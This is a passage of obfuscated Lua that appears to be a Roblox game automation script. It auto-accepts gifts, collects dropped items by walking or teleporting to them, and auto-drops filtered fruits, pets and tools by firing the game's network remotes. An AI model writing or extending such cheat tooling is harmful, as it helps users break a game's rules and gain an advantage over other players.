			G:SetValue(h.gift_receive_mode)
			g.GiftSystemUi.ReceiveTrustedDropdown = y:AddValueDropdown("gift_receive_trusted_ui", {
				Values = Z.GiftSystem.GetPlayerDropdownGiftSystem(true, h.gift_receive_trusted),
				Default = {},
				Multi = true,
				Searchable = true;
				MaxVisibleDropdownItems = 8,
				Text = "\240\159\164\157 Trusted Senders";
				Tooltip = "Selected players can be auto accepted in Trusted Only mode.",
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_receive_trusted = G
					a.Save.SaveDataSync()
				end
			})
			g.GiftSystemUi.ReceiveTrustedDropdown:SetValue(h.gift_receive_trusted, true)
			y:AddButton({
				Text = "\226\153\187\239\184\143 Refresh Trusted",
				Tooltip = "Refreshes server player lists.",
				Func = function()
					Z.GiftSystem.RefreshPlayerDropdownsGiftSystem()
				end
			})
			y:AddToggle("gift_receive_enabled_ui", {
				Text = "\226\156\133 Auto Accept Gifts",
				Default = h.gift_receive_enabled,
				Tooltip = "Automatically accepts gifts using the selected accept mode.",
				Callback = function(G)
					h.gift_receive_enabled = G
					a.Save.SaveDataSync()
				end
			})
		end
		if j then
			j:AddLabel({
				Text = "\240\159\147\166 Picks dropped items by category and source. Keep this off unless you need drop transfer.";
				DoesWrap = true
			})
			local G
			G = j:AddDropdown("gift_drop_pickup_mode_ui", {
				Values = Z.GiftSystem.GetModeValuesGiftSystem(),
				Default = h.gift_drop_pickup_mode;
				Multi = false,
				Text = "\240\159\155\161\239\184\143 Pickup Mode",
				Tooltip = "Trusted Only picks drops from selected users. Anyone picks allowed categories from all users.",
				Callback = function(G)
					if type(G) ~= "string" or G == "" then
						return
					end
					h.gift_drop_pickup_mode = G
					a.Save.SaveDataSync()
				end
			})
			G:SetValue(h.gift_drop_pickup_mode)
			g.GiftSystemUi.DropTrustedDropdown = j:AddValueDropdown("gift_drop_pickup_from_ui", {
				Values = Z.GiftSystem.GetPlayerDropdownGiftSystem(true, h.gift_drop_pickup_from);
				Default = {};
				Multi = true,
				Searchable = true;
				MaxVisibleDropdownItems = 8;
				Text = "\240\159\164\157 Pickup From";
				Tooltip = "Selected players are trusted drop sources.";
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_drop_pickup_from = G
					a.Save.SaveDataSync()
				end
			})
			g.GiftSystemUi.DropTrustedDropdown:SetValue(h.gift_drop_pickup_from, true)
			local V
			V = j:AddValueDropdown("gift_drop_pickup_categories_ui", {
				Values = Z.GiftSystem.GetDropCategoryValuesGiftSystem();
				Default = {},
				Multi = true;
				Searchable = false,
				MaxVisibleDropdownItems = 7,
				Text = "\240\159\147\166 Categories";
				Tooltip = "Only selected drop categories will be picked up.",
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_drop_pickup_categories = G
					a.Save.SaveDataSync()
				end
			})
			V:SetValue(h.gift_drop_pickup_categories)
			j:AddToggle("gift_drop_pickup_use_player_walk_ui", {
				Text = "\240\159\154\182 Use Player Walk";
				Default = h.gift_drop_pickup_use_player_walk;
				Tooltip = "Walks to dropped items first, then activates the prompt.",
				Callback = function(G)
					h.gift_drop_pickup_use_player_walk = G
					a.Save.SaveDataSync()
				end
			})
			j:AddToggle("gift_drop_pickup_enabled_ui", {
				Text = "\240\159\147\166 Enable Drop Pickup",
				Default = h.gift_drop_pickup_enabled,
				Tooltip = "Automatically picks allowed dropped items.";
				Callback = function(G)
					h.gift_drop_pickup_enabled = G
					if not G then
						Z.Teleport.UnlockTeleport(g.TeleportLockNames.GiftDropPickup)
					end
					a.Save.SaveDataSync()
				end
			})
		end
		return true
	end;
	StartGiftSystem = function()
		if Z.GiftSystem.StartedGiftSystem then
			return false
		end
		Z.GiftSystem.StartedGiftSystem = true
		local G = y.Networking and (y.Networking.Gifting and y.Networking.Gifting.Prompted)
		if G and G.OnClientEvent then
			G.OnClientEvent:Connect(function(G, V)
				Z.GiftSystem.ProcessPromptGiftSystem(G, V)
			end)
		end
		y.Players.PlayerAdded:Connect(function()
			task.defer(Z.GiftSystem.RefreshPlayerDropdownsGiftSystem)
		end)
		y.Players.PlayerRemoving:Connect(function()
			task.defer(Z.GiftSystem.RefreshPlayerDropdownsGiftSystem)
		end)
		if y.DroppedItems then
			y.DroppedItems.ChildAdded:Connect(function(G)
				task.wait(.1)
				Z.GiftSystem.ClaimDroppedItemGiftSystem(G)
			end)
		end
		task.spawn(function()
			while not g.is_forced_stop do
				task.wait(3)
				local G, V = pcall(Z.GiftSystem.ProcessSenderGiftSystem)
				if not G then
					Z.GiftSystem.SenderBusyGiftSystem = false
					Z.GiftSystem.SetStatusGiftSystem("Sender loop error", "#FF6666")
					warn("[GiftSystem Loop]", V)
				end
				if h.gift_drop_pickup_enabled and (y.DroppedItems and not Z.GiftSystem.DropBusyGiftSystem) then
					for G, V in ipairs(y.DroppedItems:GetChildren()) do
						if Z.GiftSystem.ClaimDroppedItemGiftSystem(V) then
							task.wait(.5)
						end
					end
				end
			end
		end)
		return true
	end
}
Z.GiftSystem.StartGiftSystem()
g.AutoDropItemsStatusText = ""
g.AutoDropItemsUi = g.AutoDropItemsUi or {}
Z.AutoDropItems = {
	BusyAutoDropItems = false;
	NextRunAtAutoDropItems = 0;
	DropToolAttributesAutoDropItems = {
		SeedTool = "Seeds";
		Sprinkler = "Sprinklers";
		WateringCan = "WateringCans",
		Mushroom = "Mushrooms",
		Gnome = "Gnomes";
		Raccoon = "Raccoons",
		Crate = "Crates";
		Teleporter = "Teleporters";
		PlayerMagnet = "Magnets";
		FruitMagnet = "FruitMagnets",
		PetTeleporter = "PetTeleporters";
		SeedPack = "SeedPacks";
		Wheelbarrow = "Wheelbarrows";
		Trowel = "Trowels",
		Crowbar = "Crowbars";
		Ladder = "Ladders",
		FreezeRay = "FreezeRays",
		PowerHose = "PowerHoses",
		Rake = "Rakes",
		Sign = "Signs",
		EmptyPot = "EmptyPots",
		Flashbang = "Flashbangs",
		Bird = "Birds"
	},
	SetStatusAutoDropItems = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.AutoDropItemsStatusText = ""
			return false
		end
		g.AutoDropItemsStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\147\164 [Auto Drop]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	ClearStatusAutoDropItems = function()
		g.AutoDropItemsStatusText = ""
	end;
	IsSelectionEmptyAutoDropItems = function(G)
		if Z.FruitFilters and type(Z.FruitFilters.IsSelectionEmpty) == "function" then
			return Z.FruitFilters.IsSelectionEmpty(G)
		end
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V == true or type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
		end
		return true
	end,
	IsSelectedAutoDropItems = function(G, V)
		if Z.FruitFilters and type(Z.FruitFilters.IsSelected) == "function" then
			return Z.FruitFilters.IsSelected(G, V)
		end
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end,
	PassesOptionalSelectionAutoDropItems = function(G, V)
		return Z.AutoDropItems.IsSelectionEmptyAutoDropItems(G) or Z.AutoDropItems.IsSelectedAutoDropItems(G, V)
	end;
	GetCategoryValuesAutoDropItems = function()
		if Z.GiftSystem and type(Z.GiftSystem.GetDropCategoryValuesGiftSystem) == "function" then
			return Z.GiftSystem.GetDropCategoryValuesGiftSystem()
		end
		return {
			"HarvestedFruits";
			"Seeds",
			"Pets"
		}
	end,
	GetOrderValuesAutoDropItems = function()
		return {
			"Fruits Lowest Weight",
			"Fruits Highest Weight",
			"Category A-Z";
			"Name A-Z",
			"Pets Lowest Rarity",
			"Pets Highest Rarity"
		}
	end,
	GetPetRarityValuesAutoDropItems = function()
		local G = {}
		for V, y in ipairs(Z.PetSeller and Z.PetSeller.RarityOrder or {
			"Common",
			"Uncommon",
			"Rare",
			"Epic";
			"Legendary";
			"Mythic";
			"Super",
			"Secret"
		}) do
			local j = Z.Data.GetRarityColor(y)
			table.insert(G, {
				Text = string.format("<font color=\'%s\'>%s</font>", j, y),
				Value = y
			})
		end
		return G
	end;
	GetPetSizeValuesAutoDropItems = function()
		return {
			"Normal",
			"Big",
			"Huge"
		}
	end;
	GetPetVariantValuesAutoDropItems = function()
		return {
			"Normal",
			"Rainbow"
		}
	end;
	GetItemDisplayNameAutoDropItems = function(G, V, y, Z)
		local j = G and G:GetAttribute("ItemName")
		if type(j) == "string" and j ~= "" then
			return j
		end
		if type(y) == "string" and y ~= "" then
			return y
		end
		if typeof(G) == "Instance" and tostring(G.Name or "") ~= "" then
			return tostring(G.Name)
		end
		return tostring(Z or V or "Item")
	end;
	BuildFruitDataAutoDropItems = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		local V = G:IsA("Tool") and G:GetAttribute("HarvestedFruit") == true
		local y = G:IsA("Configuration") and (G:GetAttribute("FruitProxy") == true and G:GetAttribute("HarvestedFruit") == true)
		if not V and not y then
			return nil
		end
		local j = Z.SellManager and (Z.SellManager.BuildBackpackFruitData and Z.SellManager.BuildBackpackFruitData(G)) or nil
		if type(j) ~= "table" then
			return nil
		end
		j.ob = G
		j.id = tostring(j.id or G:GetAttribute("Id") or "")
		j.name = tostring(j.name or j.n or G:GetAttribute("FruitName") or G:GetAttribute("Fruit") or "")
		j.n = j.name
		if j.id == "" or j.name == "" then
			return nil
		end
		local i, c = Z.FruitFilters.GetMutationLookup(j)
		j.v = Z.FruitFilters.GetFruitVariant(j, c)
		return j
	end;
	BuildPetDataAutoDropItems = function(G)
		if typeof(G) ~= "Instance" or not G.Parent or not G:IsA("Tool") then
			return nil
		end
		local V = G:GetAttribute("PetId")
		V = type(V) == "string" and V or tostring(V or "")
		if V == "" then
			return nil
		end
		local j = Z.PetSeller and (Z.PetSeller.FindLivePetInfo and Z.PetSeller.FindLivePetInfo(V)) or nil
		if type(j) == "table" then
			j.tool = G
			return j
		end
		local i = G:GetAttribute("PetName") or G:GetAttribute("Species") or G:GetAttribute("Name")
		i = type(i) == "string" and i or tostring(i or "")
		if i == "" then
			i = tostring(G.Name or "Pet")
		end
		local c = Z.PetSeller and (Z.PetSeller.GetBaseData and Z.PetSeller.GetBaseData(i)) or nil
		local J = Z.PetSeller and (Z.PetSeller.GetDisplayName and Z.PetSeller.GetDisplayName(i, c)) or i
		local T = Z.PetSeller and (Z.PetSeller.GetRarity and Z.PetSeller.GetRarity(i, c, {})) or "Unknown"
		local d = tostring(G:GetAttribute("Size") or "Normal")
		local u = tostring(G:GetAttribute("Type") or G:GetAttribute("Variant") or "Normal")
		return {
			id = V;
			key = V,
			name = i;
			displayName = J;
			rarity = T,
			rarityRank = g.RarityRank[T] or 999;
			size = d ~= "" and d or "Normal",
			variant = u ~= "" and u or "Normal",
			equipped = G.Parent == y.Character,
			known = type(c) == "table",
			tool = G
		}
	end,
	BuildDropDataAutoDropItems = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		local V = Z.AutoDropItems.BuildFruitDataAutoDropItems(G)
		if V then
			return {
				tool = G,
				category = "HarvestedFruits";
				id = tostring(V.id);
				name = tostring(V.name);
				fruitData = V;
				weight = tonumber(V.w) or 0
			}
		end
		if not G:IsA("Tool") then
			return nil
		end
		local y = Z.AutoDropItems.BuildPetDataAutoDropItems(G)
		if y then
			return {
				tool = G,
				category = "Pets";
				id = tostring(y.id);
				name = tostring(y.displayName or y.name or "Pet");
				petInfo = y,
				rarityRank = tonumber(y.rarityRank) or 999
			}
		end
		for V, y in pairs(Z.AutoDropItems.DropToolAttributesAutoDropItems) do
			local j = G:GetAttribute(V)
			if j ~= nil and tostring(j or "") ~= "" then
				return {
					tool = G,
					category = y,
					id = tostring(j),
					name = Z.AutoDropItems.GetItemDisplayNameAutoDropItems(G, V, j, y);
					attributeName = V
				}
			end
		end
		return nil
	end,
	IsFavouriteFruitAutoDropItems = function(G)
		local V = type(G) == "table" and G.ob or nil
		if typeof(V) ~= "Instance" then
			return false
		end
		return V:GetAttribute("IsFavorite") == true or V:GetAttribute("Favorite") == true or V:GetAttribute("Favourite") == true or V:GetAttribute("Favorited") == true or V:GetAttribute("Favourited") == true
	end,
	PassesFruitFiltersAutoDropItems = function(G)
		local V = type(G) == "table" and G.fruitData or nil
		if type(V) ~= "table" then
			return false
		end
		local y = tostring(V.name or V.n or "")
		if y == "" or tostring(V.id or "") == "" then
			return false
		end
		if h.auto_drop_protect_favourites and Z.AutoDropItems.IsFavouriteFruitAutoDropItems(V) then
			return false
		end
		if not Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_fruit_list, y) then
			return false
		end
		if V.has_weight == false or tonumber(V.w) == nil or ((tonumber(V.w) or 0)) <= 0 then
			return false
		end
		if not Z.FruitFilters.PassesWeightRange(V.w, h.auto_drop_min_weight, h.auto_drop_max_weight) then
			return false
		end
		local j, i = Z.FruitFilters.GetMutationLookup(V)
		if not Z.FruitFilters.PassesMutationSelection(i, h.auto_drop_mutation_whitelist, h.auto_drop_mutation_blacklist) then
			return false
		end
		local c = Z.FruitFilters.GetFruitVariant(V, i)
		if not Z.FruitFilters.PassesVariantSelection(c, h.auto_drop_variant_whitelist, h.auto_drop_variant_blacklist) then
			return false
		end
		return true
	end;
	PassesSeedFiltersAutoDropItems = function(G)
		if type(G) ~= "table" or G.category ~= "Seeds" then
			return false
		end
		return Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_seed_list, G.name) or Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_seed_list, G.id)
	end;
	PassesPetFiltersAutoDropItems = function(G)
		local V = type(G) == "table" and G.petInfo or nil
		if type(V) ~= "table" then
			return false
		end
		if h.auto_drop_pet_protect_equipped and V.equipped then
			return false
		end
		if Z.AutoDropItems.IsSelectedAutoDropItems(h.auto_drop_pet_protected, V.name) or Z.AutoDropItems.IsSelectedAutoDropItems(h.auto_drop_pet_protected, V.displayName) then
			return false
		end
		if not Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_pet_selected, V.name) and not Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_pet_selected, V.displayName) then
			return false
		end
		if not Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_pet_rarity_whitelist, V.rarity) then
			return false
		end
		if Z.AutoDropItems.IsSelectedAutoDropItems(h.auto_drop_pet_rarity_blacklist, V.rarity) then
			return false
		end
		if not Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_pet_size_whitelist, V.size) then
			return false
		end
		if Z.AutoDropItems.IsSelectedAutoDropItems(h.auto_drop_pet_size_blacklist, V.size) then
			return false
		end
		if not Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_pet_variant_whitelist, V.variant) then
			return false
		end
		if Z.AutoDropItems.IsSelectedAutoDropItems(h.auto_drop_pet_variant_blacklist, V.variant) then
			return false
		end
		return true
	end,
	PassesOtherItemFiltersAutoDropItems = function(G)
		if type(G) ~= "table" then
			return false
		end
		return Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_item_names, G.name) or Z.AutoDropItems.PassesOptionalSelectionAutoDropItems(h.auto_drop_item_names, G.id)
	end;
	PassesFiltersAutoDropItems = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.category or "")
		if V == "" or not Z.AutoDropItems.IsSelectedAutoDropItems(h.auto_drop_categories, V) then
			return false
		end
		if V == "HarvestedFruits" then
			return Z.AutoDropItems.PassesFruitFiltersAutoDropItems(G)
		end
		if V == "Seeds" then
			return Z.AutoDropItems.PassesSeedFiltersAutoDropItems(G)
		end
		if V == "Pets" then
			return Z.AutoDropItems.PassesPetFiltersAutoDropItems(G)
		end
		return Z.AutoDropItems.PassesOtherItemFiltersAutoDropItems(G)
	end,
	GetFruitCountsAutoDropItems = function(G)
		local V = {}
		for G, y in ipairs(type(G) == "table" and G or {}) do
			if type(y) == "table" and y.category == "HarvestedFruits" then
				local G = tostring(y.name or "")
				if G ~= "" then
					V[G] = ((V[G] or 0)) + 1
				end
			end
		end
		return V
	end,
	GetPetCountsAutoDropItems = function(G)
		local V = {}
		for G, y in ipairs(type(G) == "table" and G or {}) do
			local j = type(y) == "table" and y.petInfo or nil
			if type(j) == "table" then
				local G = Z.PetSeller and (Z.PetSeller.GetBucketKey and Z.PetSeller.GetBucketKey(j)) or tostring(j.name or "")
				if G ~= "" then
					V[G] = ((V[G] or 0)) + 1
				end
			end
		end
		return V
	end,
	SortDropItemsAutoDropItems = function(G)
		local V = tostring(h.auto_drop_order or "Fruits Lowest Weight")
		table.sort(G, function(G, y)
			if V == "Fruits Highest Weight" and (G.category == "HarvestedFruits" and y.category == "HarvestedFruits") then
				if ((tonumber(G.weight) or 0)) ~= ((tonumber(y.weight) or 0)) then
					return ((tonumber(G.weight) or 0)) > ((tonumber(y.weight) or 0))
				end
			elseif V == "Category A-Z" then
				if tostring(G.category or "") ~= tostring(y.category or "") then
					return tostring(G.category or "") < tostring(y.category or "")
				end
			elseif V == "Name A-Z" then
				if tostring(G.name or "") ~= tostring(y.name or "") then
					return tostring(G.name or "") < tostring(y.name or "")
				end
			elseif V == "Pets Lowest Rarity" and (G.category == "Pets" and y.category == "Pets") then
				if ((tonumber(G.rarityRank) or 999)) ~= ((tonumber(y.rarityRank) or 999)) then
					return ((tonumber(G.rarityRank) or 999)) < ((tonumber(y.rarityRank) or 999))
				end
			elseif V == "Pets Highest Rarity" and (G.category == "Pets" and y.category == "Pets") then
				if ((tonumber(G.rarityRank) or 999)) ~= ((tonumber(y.rarityRank) or 999)) then
					return ((tonumber(G.rarityRank) or 999)) > ((tonumber(y.rarityRank) or 999))
				end
			else
				if G.category == "HarvestedFruits" and (y.category == "HarvestedFruits" and ((tonumber(G.weight) or 0)) ~= ((tonumber(y.weight) or 0))) then
					return ((tonumber(G.weight) or 0)) < ((tonumber(y.weight) or 0))
				end
			end
			if tostring(G.category or "") ~= tostring(y.category or "") then
				return tostring(G.category or "") < tostring(y.category or "")
			end
			if tostring(G.name or "") ~= tostring(y.name or "") then
				return tostring(G.name or "") < tostring(y.name or "")
			end
			return tostring(G.id or "") < tostring(y.id or "")
		end)
	end;
	GetDropItemsAutoDropItems = function()
		local G = {}
		local V = {}
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			local j = Z.AutoDropItems.BuildDropDataAutoDropItems(y)
			if j then
				table.insert(G, j)
			end
		end
		Z.AutoDropItems.SortDropItemsAutoDropItems(G)
		local y = Z.AutoDropItems.GetFruitCountsAutoDropItems(G)
		local j = Z.AutoDropItems.GetPetCountsAutoDropItems(G)
		local i = {}
		local c = {}
		local J = math.max(math.floor(tonumber(h.auto_drop_keep_amount_per_fruit) or 0), 0)
		local T = math.max(math.floor(tonumber(h.auto_drop_pet_keep_amount) or 0), 0)
		for G, d in ipairs(G) do
			if not Z.AutoDropItems.PassesFiltersAutoDropItems(d) then
				continue
			end
			if d.category == "HarvestedFruits" and J > 0 then
				local G = tostring(d.name or "")
				local V = i[G] or 0
				if V >= math.max(((y[G] or 0)) - J, 0) then
					continue
				end
				i[G] = V + 1
			elseif d.category == "Pets" and T > 0 then
				local G = d.petInfo
				local V = Z.PetSeller and (Z.PetSeller.GetBucketKey and Z.PetSeller.GetBucketKey(G)) or tostring(G and G.name or "")
				local y = c[V] or 0
				if y >= math.max(((j[V] or 0)) - T, 0) then
					continue
				end
				c[V] = y + 1
			end
			table.insert(V, d)
		end
		return V, # G
	end;
	FindFruitToolByIdAutoDropItems = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if y and (y.Parent and (y:IsA("Tool") and (y:GetAttribute("HarvestedFruit") == true and tostring(y:GetAttribute("Id") or "") == G))) then
				return y
			end
		end
		return nil
	end,
	PromoteFruitProxyAutoDropItems = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil, "Invalid fruit"
		end
		local V = Z.AutoDropItems.FindFruitToolByIdAutoDropItems(G)
		if V then
			return V, "Ready"
		end
		local j = y.Networking and (y.Networking.Backpack and y.Networking.Backpack.PromoteFruit)
		if not j or type(j.Fire) ~= "function" then
			return nil, "Fruit hold remote missing"
		end
		local i = pcall(function()
			j:Fire(G)
		end)
		if not i then
			return nil, "Could not hold fruit"
		end
		local c = os.clock()
		repeat
			local V = Z.AutoDropItems.FindFruitToolByIdAutoDropItems(G)
			if V then
				return V, "Ready"
			end
			task.wait(.05)
		until os.clock() - c >= 2
		return nil, "Fruit did not appear"
	end;
	DropOneAutoDropItems = function(G)
		if type(G) ~= "table" or not G.tool or not G.tool.Parent then
			return false, "Item missing"
		end
		local V = tostring(G.category or "")
		local j = tostring(G.id or "")
		if V == "" or j == "" then
			return false, "Invalid item"
		end
		if h.auto_drop_preview_only == true then
			return true, "Preview"
		end
		local i = y.Networking and (y.Networking.DroppedItem and y.Networking.DroppedItem.RequestDrop)
		if not i or type(i.Fire) ~= "function" then
			return false, "Drop remote missing"
		end
		local c = Z.Player.GetTool_Holding()
		local J = G.tool
		if V == "HarvestedFruits" and (not J:IsA("Tool")) then
			local V, y = Z.AutoDropItems.PromoteFruitProxyAutoDropItems(j)
			if not V then
				return false, y or "Could not hold fruit"
			end
			J = V
			G.tool = V
		end
		if J.Parent ~= y.Character then
			if not Z.Player.EquipTool(J) then
				return false, "Could not equip item"
			end
			task.wait(.1)
		end
		local T, d = pcall(function()
			i:Fire(V, j)
		end)
		if c and (c.Parent and (c ~= G.tool and c.Parent ~= y.Character)) then
			pcall(function()
				Z.Player.EquipTool(c)
			end)
		end
		if not T then
			return false, tostring(d or "Drop failed")
		end
		return true, "Dropped"
	end;
	LoopAutoDropItems = function()
		if h.auto_drop_items_enabled ~= true then
			Z.AutoDropItems.ClearStatusAutoDropItems()
			return false
		end
		if Z.AutoDropItems.BusyAutoDropItems then
			return false
		end
		if not q.IsLoadingCompleted() then
			Z.AutoDropItems.SetStatusAutoDropItems("Waiting for loading", "#FFCC66")
			return false
		end
		if Z.AutoDropItems.IsSelectionEmptyAutoDropItems(h.auto_drop_categories) then
			Z.AutoDropItems.SetStatusAutoDropItems("Select categories first", "#FFCC66")
			return false
		end
		local G = math.clamp(tonumber(h.auto_drop_delay) or .75, .35, 30)
		if os.clock() < Z.AutoDropItems.NextRunAtAutoDropItems then
			return false
		end
		local V, y = Z.AutoDropItems.GetDropItemsAutoDropItems()
		if # V == 0 then
			Z.AutoDropItems.SetStatusAutoDropItems(y > 0 and "No items match filters" or "No droppable tools", "#FFCC66")
			Z.AutoDropItems.NextRunAtAutoDropItems = os.clock() + 2
			return false
		end
		local j = math.clamp(math.floor(tonumber(h.auto_drop_max_per_cycle) or 1), 1, 25)
		Z.AutoDropItems.BusyAutoDropItems = true
		local i, c = pcall(function()
			local y = 0
			for V, i in ipairs(V) do
				if y >= j or h.auto_drop_items_enabled ~= true then
					break
				end
				local c = Z.AutoDropItems.BuildDropDataAutoDropItems(i.tool)
				if not c or not Z.AutoDropItems.PassesFiltersAutoDropItems(c) then
					continue
				end
				local J, T = Z.AutoDropItems.DropOneAutoDropItems(c)
				if J then
					y += 1
					Z.AutoDropItems.SetStatusAutoDropItems(string.format("%s %s", tostring(T), tostring(c.name or c.category)), h.auto_drop_preview_only and "#CFCFCF" or "#66FF99")
				else
					Z.AutoDropItems.SetStatusAutoDropItems(tostring(T or "Drop failed"), "#FF6666")
					break
				end
				Z.AutoDropItems.NextRunAtAutoDropItems = os.clock() + G
				task.wait(G)
			end
			return y
		end)
		Z.AutoDropItems.BusyAutoDropItems = false
		if not i then
			Z.AutoDropItems.SetStatusAutoDropItems("System error", "#FF6666")
			warn("[AutoDropItems]", c)
			return false
		end
		if not c or c <= 0 then
			Z.AutoDropItems.SetStatusAutoDropItems("No safe item ready", "#FFCC66")
			Z.AutoDropItems.NextRunAtAutoDropItems = os.clock() + 2
		end
		return c and c > 0
	end;
	GetCurrentItemDropdownAutoDropItems = function()
		local G = {}
		local V = {}
		for y, j in ipairs(Z.Backpack.GetBackpackAllItems()) do
			local i = Z.AutoDropItems.BuildDropDataAutoDropItems(j)
			if not i or i.category == "HarvestedFruits" or i.category == "Seeds" or i.category == "Pets" then
				continue
			end
			local c = tostring(i.name or i.id or "")
			if c ~= "" and not V[c] then
				V[c] = true
				table.insert(G, {
					Text = string.format("%s <font color=\'#888888\'>(%s)</font>", c, i.category),
					Value = c
				})
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return G
	end;
	UiAutoDropItems = function(G)
		if not G then
			return false
		end
		local V = G:AddRightGroupbox("Auto Drop Items", "package-open")
		local y = G:AddRightGroupbox("Auto Drop Filters", "filter")
		if V then
			V:AddLabel({
				Text = "\240\159\147\164 Drops matching backpack tools only. Drop pickup stays separate.",
				DoesWrap = true
			})
			V:AddToggle("auto_drop_preview_only_ui", {
				Text = "\240\159\145\128 Preview Only",
				Default = h.auto_drop_preview_only,
				Tooltip = "Shows what would be dropped without dropping items.",
				Callback = function(G)
					h.auto_drop_preview_only = G
					a.Save.SaveDataSync()
				end
			})
			local G
			G = V:AddValueDropdown("auto_drop_categories_ui", {
				Values = Z.AutoDropItems.GetCategoryValuesAutoDropItems(),
				Default = {};
				Multi = true;
				Searchable = false;
				MaxVisibleDropdownItems = 10;
				Text = "\240\159\147\166 Drop Categories",
				Tooltip = "Only selected categories can be dropped.";
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_categories = G
					a.Save.SaveDataSync()
				end
			})
			G:SetValue(h.auto_drop_categories, true)
			local y
			y = V:AddDropdown("auto_drop_order_ui", {
				Values = Z.AutoDropItems.GetOrderValuesAutoDropItems(),
				Default = h.auto_drop_order;
				Multi = false;
				Text = "\226\134\149\239\184\143 Drop Order";
				Tooltip = "Choose which matching item is dropped first.",
				Callback = function(G)
					if type(G) ~= "string" or G == "" then
						return
					end
					h.auto_drop_order = G
					a.Save.SaveDataSync()
				end
			})
			y:SetValue(h.auto_drop_order)
			local j
			j = V:AddInput("auto_drop_max_per_cycle_ui", {
				Text = "\240\159\148\162 Max Per Cycle",
				Default = tostring(h.auto_drop_max_per_cycle);
				Numeric = true,
				AllowEmpty = true;
				Finished = true,
				ClearTextOnFocus = false,
				Placeholder = "Items per cycle";
				Tooltip = "Maximum matching items dropped each cycle.",
				Callback = function(G)
					local V = z(G)
					if not V or V <= 0 then
						g.Notify("Drop max per cycle must be above 0", 3)
						j:SetValue(tostring(h.auto_drop_max_per_cycle))
						return
					end
					h.auto_drop_max_per_cycle = math.clamp(V, 1, 25)
					a.Save.SaveDataSync()
				end
			})
			local i
			i = V:AddInput("auto_drop_delay_ui", {
				Text = "\226\143\177\239\184\143 Drop Delay",
				Default = tostring(h.auto_drop_delay);
				Numeric = true;
				AllowEmpty = true,
				Finished = true,
				ClearTextOnFocus = false,
				Placeholder = "Seconds",
				Tooltip = "Delay between each item drop.";
				Callback = function(G)
					local V = f(G)
					if not V or V < .35 then
						g.Notify("Drop delay must be 0.35 or more", 3)
						i:SetValue(tostring(h.auto_drop_delay))
						return
					end
					h.auto_drop_delay = math.clamp(V, .35, 30)
					a.Save.SaveDataSync()
				end
			})
			V:AddToggle("auto_drop_items_enabled_ui", {
				Text = "\240\159\147\164 Enable Auto Drop",
				Default = h.auto_drop_items_enabled,
				Tooltip = "Automatically drops backpack items that pass the selected filters.",
				Callback = function(G)
					h.auto_drop_items_enabled = G
					if not G then
						Z.AutoDropItems.BusyAutoDropItems = false
						Z.AutoDropItems.ClearStatusAutoDropItems()
					end
					a.Save.SaveDataSync()
				end
			})
		end
		if y then
			local G
			G = y:AddValueDropdown("auto_drop_fruit_list_ui", {
				Values = Z.SeedData.GetSeedDataListDropDown();
				Default = {};
				Multi = true;
				Searchable = true;
				MaxVisibleDropdownItems = 10;
				Text = "\240\159\141\142 Fruits";
				Tooltip = "Only selected fruits can be dropped. Empty allows all fruits.",
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_fruit_list = G
					a.Save.SaveDataSync()
				end
			})
			G:SetValue(h.auto_drop_fruit_list)
			local V
			local j
			local function i(G)
				local V = f(G) or tonumber(h.auto_drop_min_weight) or 0
				return string.format("\226\172\135\239\184\143 Min Drop %.2fKG", V)
			end
			local function c(G)
				local V = f(G) or tonumber(h.auto_drop_max_weight) or 89
				return string.format("\226\172\134\239\184\143 Max Drop %.2fKG", V)
			end
			V = y:AddInput("auto_drop_min_weight_ui", {
				Text = i(h.auto_drop_min_weight);
				Default = tostring(h.auto_drop_min_weight);
				Numeric = true,
				AllowEmpty = true,
				Finished = true;
				ClearTextOnFocus = false,
				Placeholder = "Press Enter to update";
				Tooltip = "Fruits below this KG will not be dropped.";
				Changed = function(G)
					if V then
						V:SetText(i(G))
					end
				end,
				Callback = function(G)
					local y = f(G)
					if not y or y < 0 or y > ((tonumber(h.auto_drop_max_weight) or 89)) then
						g.Notify("Invalid minimum drop KG", 3)
						V:SetValue(tostring(h.auto_drop_min_weight))
						V:SetText(i(h.auto_drop_min_weight))
						return
					end
					h.auto_drop_min_weight = Z.FruitFilters.RoundWeight(y)
					V:SetText(i(h.auto_drop_min_weight))
					a.Save.SaveDataSync()
				end
			})
			j = y:AddInput("auto_drop_max_weight_ui", {
				Text = c(h.auto_drop_max_weight);
				Default = tostring(h.auto_drop_max_weight);
				Numeric = true,
				AllowEmpty = true;
				Finished = true,
				ClearTextOnFocus = false;
				Placeholder = "Press Enter to update",
